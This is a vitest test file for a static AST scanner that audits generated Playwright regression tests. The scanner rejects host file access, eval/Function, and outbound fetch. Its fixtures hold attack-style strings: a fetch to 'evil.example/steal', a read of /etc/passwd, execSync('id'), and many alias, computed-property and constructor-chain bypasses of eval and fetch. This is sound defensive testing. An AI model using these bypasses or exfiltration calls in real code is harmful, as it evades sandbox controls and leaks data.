import { describe, expect, test } from 'vitest'
import { auditTrustedRegressionSourceSet } from '../src/index.js'

describe('可信生成源码静态安全扫描', () => {
  test('拒绝宿主文件 API、动态执行和非白名单环境变量', () => {
    const result = auditTrustedRegressionSourceSet([{
      relativePath: 'regression/tests/generated.spec.ts',
      bytes: Buffer.from("import fs from 'node:fs'; eval(process.env.HOME ?? '');"),
    }], 'trusted-read-only')
    expect(result.valid).toBe(false)
    expect(result.findings.map((finding) => finding.code)).toEqual(expect.arrayContaining([
      'E2E_COMPILER_SOURCE_IMPORT_FORBIDDEN',
      'E2E_COMPILER_SOURCE_API_FORBIDDEN',
      'E2E_COMPILER_SOURCE_ENV_FORBIDDEN',
    ]))
  })

  test('文件含合法 Bridge guard 时仍拒绝第二个任意 fetch 调用', () => {
    const source = `
      const url = new URL(process.env.BIZTEST_CONTROLLED_WRITE_BRIDGE!)
      if (url.protocol !== 'http:' || url.hostname !== '127.0.0.1' || url.pathname !== '/v1/reversible-write') throw new Error()
      await fetch(url, { method: 'POST' })
      await fetch('https://evil.example/steal')
    `
    const result = auditTrustedRegressionSourceSet([{
      relativePath: 'regression/fixtures/safe-page.ts', bytes: Buffer.from(source),
    }], 'trusted-reversible-write')
    expect(result.findings).toContainEqual(expect.objectContaining({
      code: 'E2E_COMPILER_SOURCE_NETWORK_FORBIDDEN', detail: 'fetch',
    }))
  })

  test('guard 文本只出现在注释中时不能放行 fetch', () => {
    const source = `
      // const url = new URL(endpoint)
      // if (url.protocol !== 'http:' || url.hostname !== '127.0.0.1' || url.pathname !== '/v1/reversible-write') {
      //   throw new Error('BIZTEST_CONTROLLED_WRITE_BRIDGE_INVALID')
      // }
      const response = await fetch(url, { method: 'POST' })
    `
    const result = auditTrustedRegressionSourceSet([{
      relativePath: 'regression/fixtures/safe-page.ts', bytes: Buffer.from(source),
    }], 'trusted-reversible-write')
    expect(result.findings).toContainEqual(expect.objectContaining({
      code: 'E2E_COMPILER_SOURCE_NETWORK_FORBIDDEN', detail: 'fetch',
    }))
  })

  test('full-playwright profile 允许 Playwright evaluate/addInitScript/request API', () => {
    const source = `
      import { test, expect } from '@playwright/test'
      test('full', async ({ page, context, request }) => {
        await page.evaluate(() => document.body.dataset.ready = 'true')
        await context.addInitScript(() => window.localStorage.setItem('ready', 'true'))
        await request.post('https://example.test/todos', { data: { title: 'todo' } })
        await expect(page.locator('body')).toBeVisible()
      })
    `
    expect(auditTrustedRegressionSourceSet([{
      relativePath: 'regression/tests/generated.spec.ts', bytes: Buffer.from(source),
    }], 'full-playwright')).toEqual({ valid: true, findings: [] })
  })

  test.each([
    ["import fs from 'node:fs'; await fs.readFile('/etc/passwd')", 'E2E_COMPILER_SOURCE_IMPORT_FORBIDDEN'],
    ['process.env.HOME', 'E2E_COMPILER_SOURCE_API_FORBIDDEN'],
    ["await import('arbitrary-tool')", 'E2E_COMPILER_SOURCE_API_FORBIDDEN'],
    ["require('child_process').execSync('id')", 'E2E_COMPILER_SOURCE_API_FORBIDDEN'],
    ["eval('page.goto(\\\"https://evil.example\\\")')", 'E2E_COMPILER_SOURCE_API_FORBIDDEN'],
    ["new Function('return process')()", 'E2E_COMPILER_SOURCE_API_FORBIDDEN'],
    ["await fetch('https://evil.example')", 'E2E_COMPILER_SOURCE_NETWORK_FORBIDDEN'],
  ])('full-playwright profile 仍拒绝宿主或动态执行：%s', (source, code) => {
    const result = auditTrustedRegressionSourceSet([{
      relativePath: 'regression/tests/generated.spec.ts', bytes: Buffer.from(source),
    }], 'full-playwright')
    expect(result.findings).toContainEqual(expect.objectContaining({ code }))
  })

  test.each([
    ["await import /* gap */ ('node:fs')", 'dynamic import with trivia'],
    ["new/*a*/Function('return process')()", 'Function constructor with trivia'],
    ["globalThis['eval']('process.exit()')", 'computed global eval'],
    ["const execute = eval; execute('process.exit()')", 'aliased eval'],
    ["const FunctionAlias = globalThis['Function']; new FunctionAlias('return process')", 'aliased Function'],
    ["const escape = (() => {}).constructor; escape('return process')()", 'constructor chain'],
    ["((execute: (source: string) => unknown) => execute('process.exit()'))(eval)", 'eval passed through parameter'],
    ["setImmediate(() => page.goto('https://evil.example'))", 'Node-only host timer'],
    ["Reflect.get(Object, 'create')({}, null)", 'Reflect meta operation'],
    ["Object.getOwnPropertyDescriptor(async () => {}, 'constructor')?.value", 'descriptor constructor escape'],
    ["Object.getPrototypeOf(async function approved() {})", 'prototype reflection escape'],
    ["Object['defineProperty']({}, 'x', { value: 1 })", 'computed Object reflection escape'],
    ["const O = Object; O.getPrototypeOf(async () => {})", 'aliased Object reflection escape'],
    ["({})['__proto__']", 'computed proto escape'],
    ["({}).prototype", 'prototype property escape'],
    ["const key = 'constructor'; ({})[key]", 'dynamic sensitive property escape'],
  ])('AST 审计拒绝正则 trivia/computed/alias 绕过：%s', (source) => {
    const result = auditTrustedRegressionSourceSet([{
      relativePath: 'regression/tests/generated.spec.ts', bytes: Buffer.from(source),
    }], 'full-playwright')
    expect(result.findings).toContainEqual(expect.objectContaining({
      code: 'E2E_COMPILER_SOURCE_API_FORBIDDEN',
    }))
  })

  test.each([
    "fetch.call(globalThis, 'https://evil.example')",
    "fetch.apply(globalThis, ['https://evil.example'])",
    "globalThis['fetch']('https://evil.example')",
    "const send = fetch; await send('https://evil.example')",
    "const send = globalThis.fetch; await send.call(globalThis, 'https://evil.example')",
    "let send; send = fetch; await send('https://evil.example')",
    "await ((send: typeof fetch) => send('https://evil.example'))(fetch)",
  ])('AST 审计拒绝宿主 fetch 的 direct/alias/call/apply 变体：%s', (source) => {
    const result = auditTrustedRegressionSourceSet([{
      relativePath: 'regression/tests/generated.spec.ts', bytes: Buffer.from(source),
    }], 'full-playwright')
    expect(result.findings).toContainEqual(expect.objectContaining({
      code: 'E2E_COMPILER_SOURCE_NETWORK_FORBIDDEN', detail: 'fetch',
    }))
  })

  test('AST 审计只在 Playwright 浏览器回调词法作用域允许 fetch', () => {
    const source = `
      import { test } from '@playwright/test'
      test('browser callbacks', async ({ page, context }) => {
        await page.evaluate(async () => {
          const send = fetch
          await send('/inside-page')
          await globalThis['fetch'].call(globalThis, '/computed-page')
        })
        await context.addInitScript(() => {
          const send = globalThis.fetch
          void send('/inside-init-script')
        })
      })
    `
    expect(auditTrustedRegressionSourceSet([{
      relativePath: 'regression/tests/generated.spec.ts', bytes: Buffer.from(source),
    }], 'full-playwright')).toEqual({ valid: true, findings: [] })
  })

  test.each([
    "await page.evaluate(() => window['eval']('1 + 1'))",
    "await context.addInitScript(() => new window['Function']('return 1')())",
  ])('浏览器回调内也永远拒绝动态执行：%s', (source) => {
    const result = auditTrustedRegressionSourceSet([{
      relativePath: 'regression/tests/generated.spec.ts', bytes: Buffer.from(source),
    }], 'full-playwright')
    expect(result.findings).toContainEqual(expect.objectContaining({
      code: 'E2E_COMPILER_SOURCE_API_FORBIDDEN',
    }))
  })

  test('仅作为 Playwright 浏览器 callback 的命名函数按 browser scope 审计', () => {
    const source = `
      const load = async () => { const send = fetch; await send('/inside') }
      await page.evaluate(load)
    `
    expect(auditTrustedRegressionSourceSet([{
      relativePath: 'regression/tests/generated.spec.ts', bytes: Buffer.from(source),
    }], 'full-playwright')).toEqual({ valid: true, findings: [] })
  })

  test.each([
    `const load = async () => fetch('/inside'); await page.evaluate(load); await load()`,
    `const load = async () => fetch('/inside'); state.callback = load; await page.evaluate(load)`,
  ])('命名 browser callback 同时 host 调用或逃逸时 fail closed：%s', (source) => {
    const result = auditTrustedRegressionSourceSet([{
      relativePath: 'regression/tests/generated.spec.ts', bytes: Buffer.from(source),
    }], 'full-playwright')
    expect(result.valid).toBe(false)
  })
})
